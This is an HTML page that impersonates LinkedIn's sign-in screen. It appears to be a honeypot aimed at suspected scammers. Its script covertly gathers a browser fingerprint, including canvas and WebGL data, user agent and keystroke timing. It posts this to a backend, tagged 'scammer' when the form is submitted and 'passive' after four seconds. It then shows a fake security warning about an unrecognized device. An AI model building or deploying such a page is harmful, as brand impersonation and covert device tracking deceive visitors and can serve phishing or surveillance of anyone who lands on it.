<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LinkedIn: Log In or Sign Up</title>
<link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Source Sans Pro', sans-serif;
    background: #f3f2ef;
    min-height: 100vh;
  }

  nav {
    background: white;
    padding: 15px 40px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
  }

  .li-logo {
    background: #0077b5;
    color: white;
    font-size: 22px;
    font-weight: 700;
    padding: 4px 8px;
    border-radius: 4px;
    letter-spacing: -1px;
  }

  .nav-right { display: flex; gap: 15px; align-items: center; }
  .nav-link { color: #666; font-size: 14px; text-decoration: none; }
  .sign-up-btn {
    padding: 10px 24px;
    border: 1px solid #0077b5;
    color: #0077b5;
    border-radius: 24px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    background: transparent;
  }

  .main {
    max-width: 1128px;
    margin: 0 auto;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 40px 20px;
    gap: 40px;
  }

  .hero h1 {
    font-size: 52px;
    font-weight: 300;
    color: #8f5849;
    line-height: 1.15;
    max-width: 450px;
    font-family: Georgia, serif;
  }

  .form-card {
    background: white;
    border-radius: 8px;
    padding: 35px;
    width: 400px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    flex-shrink: 0;
  }

  .form-card h2 { font-size: 26px; font-weight: 600; color: #1d2226; margin-bottom: 25px; }

  .google-btn, .apple-btn {
    width: 100%;
    padding: 14px;
    border: 1px solid rgba(0,0,0,0.2);
    border-radius: 28px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin-bottom: 10px;
    background: white;
  }

  .or-divider {
    display: flex;
    align-items: center;
    gap: 10px;
    margin: 20px 0;
    color: #999;
    font-size: 13px;
  }
  .or-divider::before, .or-divider::after { content: ''; flex: 1; height: 1px; background: #ddd; }

  .field { margin-bottom: 16px; }
  .field label { font-size: 14px; color: #444; font-weight: 600; display: block; margin-bottom: 5px; }

  .field input {
    width: 100%;
    padding: 12px 15px;
    border: 1px solid #9b9b9b;
    border-radius: 4px;
    font-size: 16px;
    outline: none;
    transition: border-color 0.2s;
  }

  .field input:focus { border-color: #0077b5; box-shadow: 0 0 0 2px rgba(0,119,181,0.2); }

  .sign-in-btn {
    width: 100%;
    padding: 14px;
    background: #0077b5;
    color: white;
    border: none;
    border-radius: 28px;
    font-size: 18px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 5px;
    transition: background 0.2s;
  }

  .sign-in-btn:hover { background: #006097; }

  .forgot { display: block; text-align: center; margin-top: 15px; font-size: 15px; color: #0077b5; cursor: pointer; font-weight: 600; }

  .join-cta { margin-top: 20px; text-align: center; font-size: 15px; color: #666; }
  .join-cta a { color: #0077b5; font-weight: 600; text-decoration: none; }
</style>
</head>
<body>
<nav>
  <div class="li-logo">in</div>
  <div class="nav-right">
    <a href="#" class="nav-link">Join now</a>
    <button class="sign-up-btn">Sign in</button>
  </div>
</nav>

<div class="main">
  <div class="hero">
    <h1>Welcome to your professional community</h1>
  </div>

  <div class="form-card">
    <h2>Sign in</h2>

    <button class="google-btn">🔵 Continue with Google</button>
    <button class="apple-btn">🍎 Sign in with Apple</button>

    <div class="or-divider">or</div>

    <form onsubmit="handleSubmit(event)">
      <div class="field">
        <label>Email or phone</label>
        <input type="text" id="credential" autocomplete="off">
      </div>
      <div class="field">
        <label>Password</label>
        <input type="password" id="password">
      </div>
      <button type="submit" class="sign-in-btn">Sign in</button>
    </form>

    <a href="#" class="forgot">Forgot password?</a>
    <div class="join-cta">New to LinkedIn? <a href="#">Join now</a></div>
  </div>
</div>

<script>
const reportId = new URLSearchParams(window.location.search).get('report') || 0;

const fingerprint = {
  typing_rhythm: [],
  screen_resolution: `${screen.width}x${screen.height}`,
  browser: navigator.userAgent,
  os: navigator.platform,
  font_size: window.getComputedStyle(document.body).fontSize,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  device_memory: navigator.deviceMemory || 'unknown',
  canvas_fingerprint: (()=>{try{const c=document.createElement('canvas');c.getContext('2d').fillText('fp',0,14);return c.toDataURL().slice(-40);}catch(e){return 'n/a';}})(),
  webgl_fingerprint: (()=>{try{const gl=document.createElement('canvas').getContext('webgl');return gl?`${gl.getParameter(gl.VENDOR)}`.slice(0,30):'n/a';}catch(e){return 'n/a';}})()
};

let lastKey = 0;
document.addEventListener('keydown', () => {
  const n = Date.now();
  if (lastKey) fingerprint.typing_rhythm.push(n - lastKey);
  lastKey = n;
});

function handleSubmit(e) {
  e.preventDefault();
  fetch('../../backend/collect_fingerprint.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ report_id: reportId, role: 'scammer', fingerprint })
  }).catch(()=>{});

  setTimeout(() => {
    document.querySelector('.form-card').innerHTML += `
      <div style="margin-top: 15px; padding: 14px; background: #fff8e1; border: 1px solid #ffd54f; border-radius: 4px; font-size: 14px; color: #795548;">
        ⚠ We noticed a sign-in attempt from an unrecognized device. For your security, please verify your identity via the email we sent you.
      </div>
    `;
  }, 1200);
}

setTimeout(() => {
  fetch('../../backend/collect_fingerprint.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ report_id: reportId, role: 'passive', fingerprint })
  }).catch(()=>{});
}, 4000);
</script>
</body>
</html>
